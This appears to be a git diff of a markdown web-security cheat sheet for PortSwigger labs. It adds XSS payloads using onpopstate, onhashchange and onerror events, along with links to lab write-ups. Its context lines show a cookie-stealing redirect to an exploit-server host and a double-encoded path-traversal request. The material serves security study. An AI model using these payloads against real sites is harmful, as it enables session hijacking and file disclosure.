@@ -74,15 +74,26 @@ document.location='https://exploit.exploit-server.net/cookies?c='+document.cooki
 
 ```JavaScript
 ?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
-```
-<sup>Body and event **'onpopstate'** is only allowed</sup>  
+```  
 
+<sup>Body and event **'onpopstate'** is only allowed</sup>  
+  
 ```JavaScript
 ?search=%22%3E%3Cbody%20onpopstate=print()>
-```
+```  
+
 [Example: onpopstate event (XSS)](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onpopstate)  
 
->The below lab gives great Methodology to identify allowed HTML tags and events for crafting POC XSS.  
+<sup>OnHashChange XSS</sup>  
+  
+```JavaScript
+<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
+```  
+
+[DOM XSS in jQuery selector sink using a hashchange event](https://github.com/Crypto-Cat/CTF/blob/main/web/WebSecurityAcademy/xss/dom_xss_jquery_hashchange/writeup.md)  
+
+
+>The below lab gives great **Methodology** to identify allowed HTML tags and events for crafting POC XSS.  
 
 [PortSwigger Lab: Reflected XSS into HTML context with most tags and attributes blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked)  
   
@@ -1172,7 +1183,7 @@ GET /admin_controls/metrics/admin-image?imagefile=%252e%252e%252f%252e%252e%252f
 Youtube channels:  
 1. Rana Khalil  
 2. David Bombal  
-3. intigriti  
+3. [intigriti](https://www.youtube.com/@intigriti/videos)  
 4. Seven Seas Security  
 5. LiveUnderflow  
 6. Tib3rius  
